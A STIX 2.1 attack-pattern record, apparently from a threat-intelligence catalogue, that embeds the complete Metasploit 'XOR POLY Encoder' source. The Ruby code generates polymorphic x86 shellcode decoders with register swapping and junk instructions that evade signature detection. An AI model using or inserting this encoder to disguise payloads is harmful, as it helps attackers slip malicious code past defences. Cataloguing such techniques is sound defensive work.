{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0c2a80c8-d697-4d60-8a34-47e9660ad6ff",
    "created": "2024-08-14T16:33:19.213472Z",
    "modified": "2024-08-14T16:33:19.213476Z",
    "name": "XOR POLY Encoder",
    "description": "An x86 Simple POLY Xor encoding method. using polymorphism Register swapping, and instructions modification",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/x86/xor_poly.rb",
            "external_id": "xor_poly.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Encoder::Xor\n\n  def initialize\n    super(\n      'Name' => 'XOR POLY Encoder',\n      'Description' => 'An x86 Simple POLY Xor encoding method. using polymorphism Register swapping, and instructions modification',\n      'Author' => [ 'Arthur RAOUT' ],\n      'Arch' => ARCH_X86,\n      'License' => MSF_LICENSE,\n      'Decoder' => {\n        'KeySize' => 4,\n        'BlockSize' => 4,\n        'KeyPack' => 'V'\n      }\n      )\n  end\n\n  # Indicate that this module can preserve the registers used\n  def can_preserve_registers?\n    true\n  end\n\n  # select a permutation from table\n  def choose_permutation(state, table)\n    table = table.shuffle\n    for i in 0..table.length - 1\n      if table[i].count(state.badchars).zero?\n        return table[i]\n      end\n    end\n    raise 'No permutation found for the badchar set :' + state.badchars.inspect\n  end\n\n  # generate instruction for a push\n  def register_preservation_generate(flag, regs)\n    ret = ''\n    pop = 0b0101_1000\n    push = 0b0101_0000\n    if flag == 0\n      for r in regs\n        ret += [push | r].pack('C')\n      end\n    end\n    if flag == 1\n      for r in regs.reverse\n        ret += [pop | r].pack('C')\n      end\n    end\n    return ret\n  end\n\n  def decoder_stub(state)\n    state.decoder_key_size = 4\n    state.decoder_key_pack = 'V'\n    # calculate the (negative) and positiv block count.\n    block_count = [-(((state.buf.length - 1) / state.decoder_key_size) + 1)].pack('V')\n    block_count_positive = [(((state.buf.length - 1) / state.decoder_key_size) + 1)].pack('V')\n\n    regs = [0b0000, 0b0001, 0b0010, 0b0011, 0b0110, 0b0111]\n\n    pop = 0b0101_1000\n    push = 0b0101_0000\n    mov = 0b1011_1000\n\n    reg1 = regs[rand(6)]\n    regs.delete(reg1)\n    reg2 = regs[rand(5)]\n    regs.delete(reg2)\n    reg3 = regs[rand(4)]\n    regs.delete(reg3)\n    reg4 = regs[rand(3)] # reg4 is useless and used for nopLike operations\n    regs.delete(reg4)\n\n    # NOPS\n    nop_nop_nop_nop = \"\\x90\\x90\\x90\\x90\" # 4 bytes\n    push_pop12 = [push | reg1, push | reg2, pop | reg2, pop | reg1].pack('CCCC') # 4 bytes\n    push_pop34 = [push | reg3, push | reg4, pop | reg4, pop | reg3].pack('CCCC') # 4 bytes\n    push_pop56 = [push | reg4, push | reg1, pop | reg1, pop | reg4].pack('CCCC') # 4 bytes\n\n    sub_reg_0 = [0x83, (0xE8 | rand(6)), 0x00].pack('CCC') # 3 bytes\n    add_reg_0 = [0x83, (0xc0 | rand(6)), 0x00].pack('CCC') # 3 bytes\n    add_reg4_1 = [0x83, (0xc0 | reg4), 0x01].pack('CCC') # 3 bytes\n    add_reg4_33 = [0x83, (0xc0 | reg4), 0x33].pack('CCC') # 3 bytes\n    add_reg4_f1 = [0x83, (0xc0 | reg4), 0xf1].pack('CCC') # 3 bytes\n    nop_nop_nop = \"\\x90\\x90\\x90\" # 3 bytes\n\n    push_pop1 = [push | reg1, pop | reg1].pack('CC') # 2 bytes\n    push_pop2 = [push | reg2, pop | reg2].pack('CC') # 2 bytes\n    push_pop3 = [push | reg3, pop | reg3].pack('CC') # 2 bytes\n    push_pop4 = [push | reg4, pop | reg4].pack('CC') # 2 bytes\n    inc_reg1_dec_reg1 = [0x40 | reg1, 0x48 | reg1].pack('CC') # 2 bytes\n    inc_reg2_dec_reg2 = [0x40 | reg2, 0x48 | reg2].pack('CC') # 2 bytes\n    inc_reg3_dec_reg3 = [0x40 | reg3, 0x48 | reg3].pack('CC') # 2 bytes\n    inc_reg4_dec_reg4 = [0x40 | reg4, 0x48 | reg4].pack('CC') # 2 bytes\n\n    # nops tables by size\n    nops_2_bytes = [push_pop1, push_pop2, push_pop3, push_pop4, \"\\x90\\x90\", inc_reg1_dec_reg1, inc_reg2_dec_reg2, inc_reg3_dec_reg3, inc_reg4_dec_reg4]\n    nops_3_bytes = [nop_nop_nop, push_pop1 + \"\\x90\", push_pop2 + \"\\x90\", push_pop3 + \"\\x90\", push_pop4 + \"\\x90\", sub_reg_0, add_reg_0, choose_permutation(state, nops_2_bytes) + \"\\x90\", add_reg4_1, add_reg4_33, add_reg4_f1]\n    nops_4_bytes = [nop_nop_nop_nop, push_pop12, push_pop34, push_pop56, choose_permutation(state, nops_2_bytes) + choose_permutation(state, nops_2_bytes), choose_permutation(state, nops_3_bytes) + \"\\x90\"]\n\n    # THE DECODER CODE\n    pop_reg1 = [pop | reg1].pack('C')\n\n    # sub 5 from reg1 on 5 byte\n    sub_reg1_5 = [0x83, (0xE8 | reg1), 0x05].pack('CCC') + choose_permutation(state, nops_2_bytes) # 5 bytes\n    add_reg1_neg5 = [0x83, (0xc0 | reg1), 0xfb].pack('CCC') + choose_permutation(state, nops_2_bytes) # 5 bytes\n    dec_reg1_5 = [0x48 | reg1, 0x48 | reg1, 0x48 | reg1, 0x48 | reg1, 0x48 | reg1].pack('CCCCC') # 5 bytes\n\n    # set reg2 to 0, on 6 bytes\n    xor_reg2_reg2 = [0x31, (0xC0 | (reg2 << 3) | reg2)].pack('CC') + choose_permutation(state, nops_4_bytes) # 6 bytes\n    and_reg2_0 = [0x83, (0xE0 | reg2), 0x00].pack('CCC') + choose_permutation(state, nops_3_bytes) # 6 bytes\n    lea_reg2_0 = [0x8D, (0x05 | (reg2 << 3)), 0x00, 0x00, 0x00, 0x00].pack('CCCCCC')\n    imul_reg2_reg2_0 = [0x6b, (0xC0 | (reg2 << 3) | reg2), 0x00].pack('CCC') + choose_permutation(state, nops_3_bytes) # 6 bytes\n    sub_reg2_reg2 = [0x29, (0xC0 | (reg2 << 3) | reg2)].pack('CC') + choose_permutation(state, nops_4_bytes) # 6 bytes\n    push0_popreg2 = [0x6A, 0x00, (0x58 | reg2)].pack('CCC') + choose_permutation(state, nops_3_bytes) # 6 bytes\n\n    # SET REG2 TO BLOCK_COUNT\n    sub_reg2_bc = [0x81, (0xe8 | reg2)].pack('CC') + block_count\n    add_reg2_bc = [0x81, (0xc0 | reg2)].pack('CC') + block_count_positive\n\n    mov_reg3 = [mov | reg3].pack('C')\n    xor_rel_reg1_reg3 = [0x31, (0x40 | (reg3 << 3 | reg1))].pack('cc')\n\n    # ADD 4 TO REG1\n    add_reg1_4 = [0x83, (0xC0 | reg1), 0x04].pack('CCC') + choose_permutation(state, nops_3_bytes) # 6 bytes\n    sub_reg1_neg4 = [0x83, (0xE8 | reg1), 0xFC].pack('CCC') + choose_permutation(state, nops_3_bytes) # 6 bytes\n    inc_reg1_4 = [0x40 | reg1, 0x40 | reg1, 0x40 | reg1, 0x40 | reg1].pack('CCCC') + choose_permutation(state, nops_2_bytes) # 6 bytes\n\n    # sub 1 from reg2 on 6 bytes\n    dec_r2 = [0xFF, (0xC8 | reg2)].pack('CC')\n    sub_reg2_1 = [0x83, (0xE8 | reg2), 0x01].pack('CCC')\n    add_reg2_neg1 = [0x83, (0xC0 | reg2), 0xFF].pack('CCC')\n\n    set_reg2_0 = [xor_reg2_reg2, and_reg2_0, lea_reg2_0, imul_reg2_reg2_0, sub_reg2_reg2, push0_popreg2]\n    sub_reg1_0x5 = [sub_reg1_5, add_reg1_neg5, dec_reg1_5]\n    set_reg2_bc = [sub_reg2_bc, add_reg2_bc]\n\n    # GET EIP TO REG1\n    call_pop = [0xE8, 0x00, 0x00, 0x00, 0x00].pack('CCCCC') + pop_reg1 + choose_permutation(state, sub_reg1_0x5)\n    fpu_inst = [\"\\xD9\\xE0\", \"\\xDF\\xE9\", \"\\xDB\\xC9\", \"\\xDA\\xD9\", \"\\xDA\\xC1\", \"\\xDA\\xD1\", \"\\xDB\\xD9\"] # 2 bytes\n    fnstenv_pop = choose_permutation(state, fpu_inst) + \"\\xD9\\x74\\x24\\xF4\" + pop_reg1\n    add_reg1_0x4 = [add_reg1_4, sub_reg1_neg4, inc_reg1_4]\n    dec_reg2 = [dec_r2, sub_reg2_1, add_reg2_neg1]\n    get_eip = [call_pop, fnstenv_pop]\n\n    small_junk = [choose_permutation(state, nops_2_bytes), choose_permutation(state, nops_3_bytes), choose_permutation(state, nops_4_bytes)]\n\n    reg_for_preservation = [reg1, reg2, reg3, reg4].shuffle\n    reg_push = register_preservation_generate(0, reg_for_preservation)\n    reg_pop = register_preservation_generate(1, reg_for_preservation)\n    geip = choose_permutation(state, get_eip)\n    junk = choose_permutation(state, small_junk)\n    reg2_0 = choose_permutation(state, set_reg2_0)\n    block_count_set = choose_permutation(state, set_reg2_bc)\n    reg1_add4 = choose_permutation(state, add_reg1_0x4)\n    decrement_reg2 = choose_permutation(state, dec_reg2)\n\n    decoder = reg_push +\n              geip +                                      # get EIP into REG1\n              junk +                                      # small junk\n              reg2_0 +                                    # set REG2 to 0\n              block_count_set + # sub reg2, block_count\n              mov_reg3 + 'XXXX' +                         # mov reg3, 0xKEY_KEY_KEY_KEY\n              xor_rel_reg1_reg3 + 'LL' +                  # xor [reg1+DECODER_LEN], reg3\n              reg1_add4 + # add reg1, 4\n              decrement_reg2 + # dec reg2\n              \"\\x75\" + 'SS' + # jnz to xor\n              reg_pop\n\n    decoder_len = decoder.size\n    jmp = decoder.index(xor_rel_reg1_reg3) - decoder.index('SS')\n    decoder.sub! 'SS', [jmp].pack('C')\n    decoder.sub! 'LL', [decoder_len - 6].pack('C')\n    # example of decoder generated\n    # e800000000     call loc._start.continue\n    # 58             pop eax\n    # 83e805         sub eax, 5\n    # 31c9           xor ecx, ecx\n    # 81e9bbbbbbbb   sub ecx, 0xbbbbbbbb\n    # bbaaaaaaaa     mov ebx, 0xaaaaaaaa\n    # 31581f         xor dword [eax + 0x1f], ebx\n    # 83e8f4         sub eax, 0xfffffff4\n    # e2f8           loop loc._start.check\n    state.decoder_key_offset = decoder.index('XXXX')\n    return decoder\n  end\nend\n"
}